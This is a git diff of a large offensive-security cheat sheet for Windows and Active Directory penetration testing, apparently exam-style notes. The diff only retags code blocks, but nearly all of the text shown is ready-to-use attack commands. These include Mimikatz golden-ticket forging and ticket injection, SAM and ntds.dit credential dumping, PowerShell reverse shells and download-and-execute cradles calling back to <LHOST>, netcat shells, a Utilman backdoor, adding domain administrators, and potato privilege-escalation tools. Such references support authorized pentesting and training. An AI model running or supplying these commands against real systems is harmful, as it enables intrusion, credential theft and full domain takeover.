 ###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Inject TGS with Mimikatz
 
-```console
+```cmd
 kerberos::ptt <KIRBI_FILE>
 ```
 
 ##### Rubeus Examples
 
-```console
+```cmd
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute CMD on Remote Host
 
-```console
+```cmd
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -5191,25 +5191,25 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Generate TGT with NTLM
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 128bit Key
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
-```console
+```cmd
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
 ```
 
 ###### Inject TGT with Mimikatz
 
-```console
+```cmd
 kerberos::ptt <KIRBI_FILE>
 ```
 
@@ -5217,13 +5217,13 @@ kerberos::ptt <KIRBI_FILE>
 
 ###### Inject Ticket with Rubeus
 
-```console
+```cmd
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute CMD on Remote Host
 
-```console
+```cmd
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -5611,7 +5611,7 @@ rm ./'--checkpoint-action=exec=python script.sh'
 
 ##### Basic Microsoft Windows Enumeration
 
-```console
+```cmd
 whoami /all
 whoami /user
 systeminfo
@@ -5658,19 +5658,19 @@ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'St
 
 ###### Checking File Permissions
 
-```console
+```cmd
 .\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
 ```
 
 ###### Checking Service Permissions
 
-```console
+```cmd
 .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
 ```
 
 ###### Checking Path Permissions to find Unquoted Service Paths
 
-```console
+```cmd
 .\accesschk.exe /accepteula -uwdq C:\
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
@@ -5678,13 +5678,13 @@ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'St
 
 ###### Checking Registry Entries
 
-```console
+```cmd
 .\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
 ```
 
 ##### Show hidden Files and Folders
 
-```console
+```cmd
 dir /a      // show hidden folders
 dir /a:d    // show all hidden directories
 dir /a:h    // show all hidden files
@@ -5696,15 +5696,15 @@ powershell ls -force    // show all hidden files
 
 ##### Show installed Applications
 
-```console
-PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```cmd
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 
 ##### User Handling
 
 ###### Adding Users to Groups
 
-```console
+```cmd
 net user <USERNAME> <PASSWORD> /add /domain
 net group "Exchange Windows Permissions" /add <USERNAME>
 net localgroup "Remote Management Users" /add <USERNAME>
@@ -5718,7 +5718,7 @@ net localgroup "Remote Management Users" /add <USERNAME>
 
 > https://www.nirsoft.net/utils/credentials_file_view.html
 
-```console
+```cmd
 cmdkey /list
 rundll32 keymgr.dll, KRShowKeyMgr
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -5728,7 +5728,7 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 
 ###### Search for Passwords
 
-```console
+```cmd
 findstr /si password *.xml *.ini *.txt
 dir .s *pass* == *.config
 dir /s *pass* == *cred* == *vnc* == *.config*
@@ -5739,7 +5739,7 @@ Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc
 
 ###### PowerShell History
 
-```console
+```cmd
 Get-History
 (Get-PSReadlineOption).HistorySavePath
 type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -5747,33 +5747,33 @@ type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
 
 ###### Saved Windows Credentials
 
-```console
+```cmd
 cmdkey /list
 runas /savecred /user:<USERNAME> cmd.exe
 ```
 
 ###### Winlogon Credentials
 
-```console
+```cmd
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
 ###### Local Administrator Password Solution (LAPS)
 
-```console
+```cmd
 Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
 ```
 
 ###### Search the Registry for Passwords
 
-```console
+```cmd
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
 ###### Dumping Credentials
 
-```console
+```cmd
 reg save hklm\system system
 reg save hklm\sam sam
 reg.exe save hklm\sam c:\temp\sam.save
@@ -5783,20 +5783,20 @@ reg.exe save hklm\system c:\temp\system.save
 
 ###### Find KeePass Databases
 
-```console
+```cmd
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ###### Internet Information Service (IIS)
 
-```console
+```cmd
 C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
 ###### PuTTY
 
-```console
+```cmd
 reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
@@ -5812,20 +5812,20 @@ C:\Windows\system32\sysprep\sysprep.xml
 
 ##### Enable WinRM
 
-```console
+```cmd
 winrm quickconfig
 ```
 
 ##### Enable Remote Desktop (RDP)
 
-```console
+```cmd
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
 
 or
 
-```console
+```cmd
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
@@ -5835,7 +5835,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
 
 ###### AlwaysInstallElevated
 
-```console
+```cmd
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
@@ -5846,7 +5846,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
 ```
 
-```console
+```cmd
 msiexec /quiet /qn /i <FILE>.msi
 ```
 
@@ -5854,7 +5854,7 @@ msiexec /quiet /qn /i <FILE>.msi
 
 ###### Backup SAM and SYSTEM Hashes
 
-```console
+```cmd
 reg save hklm\system C:\Users\<USERNAME>\system.hive
 reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 ```
@@ -5875,26 +5875,26 @@ pypykatz registry --sam sam.hive system.hive
 
 ###### Script for PowerShell Environment
 
-```console
+```cmd
 SET CONTEXT PERSISTENT NOWRITERSp
 add volume c: alias foobarp
 createp
 expose %foobar% z:p
 ```
 
-```console
+```cmd
 diskshadow /s <FILE>.txt
 ```
 
 ###### Copy ntds.dit
 
-```console
+```cmd
 Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
 ```
 
 ###### Export System Registry Value
 
-```console
+```cmd
 reg save HKLM\SYSTEM c:\temp\system
 ```
 
@@ -5906,12 +5906,12 @@ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 
 ###### Alternative Way via Robocopy
 
-```console
+```cmd
 reg save hklm\sam C:\temp\sam
 reg save hklm\system C:\temp\system
 ```
 
-```console
+```cmd
 set metadata C:\Windows\temp\meta.cabX
 set context clientaccessibleX
 set context persistentX
@@ -5922,7 +5922,7 @@ expose %cdrive% E:X
 end backupX
 ```
  
-```console
+```cmd
 diskshadow /s script.txt
 robocopy /b E:\Windows\ntds . ntds.dit
 ```
@@ -5933,12 +5933,12 @@ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 
 ###### SeLoadDriverPrivilege
 
-```console
+```cmd
 sc.exe query
 $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
 ```
 
-```console
+```cmd
 sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
 sc.exe stop VSS
 sc.exe start VSS
@@ -5946,15 +5946,15 @@ sc.exe start VSS
 
 ###### SeTakeOwnershipPrivilege
 
-```console
+```cmd
 takeown /f C:\Windows\System32\Utilman.exe
 ```
 
-```console
+```cmd
 icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
 ```
 
-```console
+```cmd
 C:\Windows\System32\> copy cmd.exe utilman.exe
 ```
 
@@ -5964,7 +5964,7 @@ Click the `Ease of Access` button on the logon screen to get a shell with `NT Au
 
 > https://github.com/antonioCoco/RogueWinRM
 
-```console
+```cmd
 .\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
 ```
 
@@ -5979,7 +5979,7 @@ Click the `Ease of Access` button on the logon screen to get a shell with `NT Au
 5. The current directory.
 6. The directories that are listed in the PATH environment variable.
 
-```console
+```cmd
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 icacls .\PATH\TO\BINARY\<BINARY>.exe
 Restart-Service <SERVICE>
@@ -6025,7 +6025,7 @@ x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
 
 Copy the `.dll` file to the desired path.
 
-```console
+```cmd
 Restart-Service <SERVICE>
 Get-LocalGroupMember administrators
 ```
@@ -6034,13 +6034,13 @@ Get-LocalGroupMember administrators
 
 ###### Running Services Enumeration
 
-```console
+```cmd
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
 
 ###### Service Configuration Enumeration
 
-```console
+```cmd
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
 ```
 
@@ -6056,7 +6056,7 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object
 
 ###### Permission Enumeration
 
-```console
+```cmd
 icacls "C:\PATH\TO\BINARY\<BINARY>"
 ```
 
@@ -6086,21 +6086,21 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 ###### Execution
 
-```console
+```cmd
 net stop <SERVICE>
 net start <SERVICE>
 ```
 
 or 
 
-```console
+```cmd
 shutdown /r /t 0
 Get-LocalGroupMember administrators
 ```
 
 ###### PowerView Example
 
-```console
+```cmd
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-ModifiableServiceFile
@@ -6109,7 +6109,7 @@ Install-ServiceBinary -Name '<SERVICE>'
 
 ###### Service Execution Properties Enumeration
 
-```console
+```cmd
 $ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
 $ModifiableFiles
 $ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
@@ -6133,7 +6133,7 @@ C:\Program Files\my example\my example\example.exe
 
 Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.
 
-```console
+```cmd
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 Start-Service <SERVICE>
@@ -6147,7 +6147,7 @@ Get-LocalGroupMember administrators
 
 ###### PowerView Example
 
-```console
+```cmd
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-UnquotedService
@@ -6160,7 +6160,7 @@ Get-LocalGroupMember administrators
 
 Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.
 
-```console
+```cmd
 schtasks /query /fo LIST /v
 icacls C:\PATH\TO\BINARY\<BINARY>.exe
 Get-LocalGroupMember administrators
@@ -6170,7 +6170,7 @@ Get-LocalGroupMember administrators
 
 > https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
 
-```console
+```cmd
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
 Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
@@ -6257,13 +6257,13 @@ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tc
 
 #### powercat
 
-```console
+```cmd
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
 ```
 
 #### Powermad
 
-```console
+```cmd
 Import-Module ./Powermad.ps1
 $secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
 New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
@@ -6273,7 +6273,7 @@ New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DO
 
 ##### Common Commands
 
-```console
+```cmd
 whoami /all
 getuserid
 systeminfo
@@ -6290,26 +6290,26 @@ type <FILE> | findstr /l <STRING>
 
 ##### Allow Script Execution
 
-```console
+```cmd
 Set-ExecutionPolicy remotesigned
 Set-ExecutionPolicy unrestricted
 ```
 
 ##### Script Execution Bypass
 
-```console
+```cmd
 powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ##### Import Module to PowerShell cmdlet
 
-```console
+```cmd
 Import-Module .\<FILE>
 ```
 
 ##### Check PowerShell Versions
 
-```console
+```cmd
 Set-ExecutionPolicy Unrestricted
 powershell -Command "$PSVersionTable.PSVersion"
 powershell -c "[Environment]::Is64BitProcess"
@@ -6317,13 +6317,13 @@ powershell -c "[Environment]::Is64BitProcess"
 
 ##### Read PowerShell History
 
-```console
+```cmd
 type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ##### Base64 Encoding using pwsh
 
-```console
+```cmd
 pwsh
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -6333,32 +6333,32 @@ $EncodedText
 
 ##### Create a .zip File
 
-```console
+```cmd
 Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 ##### Unzip a File
 
-```console
+```cmd
 Expand-Archive -Force <FILE>.zip
 ```
 
 ##### Start a new Process
 
-```console
+```cmd
 Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
 ```
 
 ##### Invoke-Expression / Invoke-WebRequest
 
-```console
+```cmd
 IEX(IWR http://<LHOST>/<FILE>.ps1)
 Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 ```
 
 ##### .NET Reflection
 
-```console
+```cmd
 $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
@@ -6367,7 +6367,7 @@ $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 
 ##### Switching Sessions in PowerShell
 
-```console
+```cmd
 $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
 Enter-PSSession -ComputerName <RHOST> -Credential $cred
@@ -6375,7 +6375,7 @@ Enter-PSSession -ComputerName <RHOST> -Credential $cred
 
 or
 
-```console
+```cmd
 $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
 $Session = New-PSSession -Credential $Cred
@@ -6384,7 +6384,7 @@ Invoke-Command -Session $session -scriptblock { whoami }
 
 or
 
-```console
+```cmd
 $username = '<USERNAME>'
 $password = '<PASSWORD>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -6392,13 +6392,13 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 Start-Process powershell.exe -Credential $credential
 ```
 
-```console
+```cmd
 powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
 ##### Add new Domain Administrator
 
-```console
+```cmd
 $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
 New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
 Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
@@ -6406,7 +6406,7 @@ Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
 
 ##### Execute Commands in User Context
 
-```console
+```cmd
 $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
 $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
 Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
@@ -6414,7 +6414,7 @@ Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -creden
 
 ##### Execute Scripts with Credentials (Reverse Shell)
 
-```console
+```cmd
 $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
 Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
@@ -6422,12 +6422,12 @@ Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).do
 
 #### PrivescCheck
 
-```console
+```cmd
 Set-ExecutionPolicy Bypass -Scope Process -Force
 . .\PrivescCheck.ps1
 ```
 
-```console
+```cmd
 Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
@@ -6484,7 +6484,7 @@ srvinfo
 
 ##### Common Commands
 
-```console
+```cmd
 .\Rubeus.exe dump /nowrap
 .\Rubeus.exe asreproast /nowrap
 .\Rubeus.exe asreproast /outfile:hashes.asreproast
@@ -6494,25 +6494,25 @@ srvinfo
 
 ##### Request a Delegation Ticket
 
-```console
+```cmd
 .\Rubeus.exe tgtdeleg /nowrap
 ```
 
 ##### Overpass the Hash
 
-```console
+```cmd
 .\Rubeus.exe kerberoast /user:<USERNAME>
 ```
 
 ##### Pass the Hash
 
-```console
+```cmd
 .\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
 ```
 
 #### RunasCs
 
-```console
+```cmd
 .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
 .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
 .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac -l 5 -b
@@ -6523,7 +6523,7 @@ srvinfo
 
 #### Seatbelt
 
-```console
+```cmd
 .\Seatbelt.exe -group=system
 .\Seatbelt.exe -group=all
 .\Seatbelt.exe -group=all -full
@@ -6620,19 +6620,19 @@ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 
 ##### Payload
 
-```console
+```cmd
 IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
 ```
 
 or
 
-```console
+```cmd
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
 ```
 
 or
 
-```console
+```cmd
 $client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
@@ -6650,10 +6650,10 @@ JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
 
 ```console
 $ pwsh
-PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-PS> $EncodedText =[Convert]::ToBase64String($Bytes)
-PS> $EncodedText
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
 ```
 
 ##### Python Script for Formatting
@@ -6785,7 +6785,7 @@ Put the `config.Library-ms` file in the `webdav` folder.
 
 Right-click on Windows to create a new `shortcut file`.
 
-```console
+```cmd
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
 ```
 
@@ -7378,14 +7378,14 @@ void DoStuff() {
 
 First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.
 
-```console
+```cmd
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
 LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 ```
 
 At least trigger `StorSvc` via `RpcClient.exe`.
 
-```console
+```cmd
 .\RpcClient.exe
 ```
 
@@ -7597,7 +7597,7 @@ else:
 
 > https://github.com/BeichenDream/GodPotato
 
-```console
+```cmd
 .\GodPotato-NET4.exe -cmd '<COMMAND>'
 ```
 
@@ -7672,7 +7672,7 @@ $RESULT | ogv
 
 ##### Execution
 
-```console
+```cmd
 .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
@@ -7680,7 +7680,7 @@ $RESULT | ogv
 
 > https://github.com/antonioCoco/JuicyPotatoNG
 
-```console
+```cmd
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
@@ -7710,7 +7710,7 @@ mysql -u root
 
 > https://github.com/itm4n/PrintSpoofer
 
-```console
+```cmd
 .\PrintSpoofer64.exe -i -c powershell
 ```
 
@@ -7718,7 +7718,7 @@ mysql -u root
 
 > https://github.com/bugch3ck/SharpEfsPotato
 
-```console
+```cmd
 SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
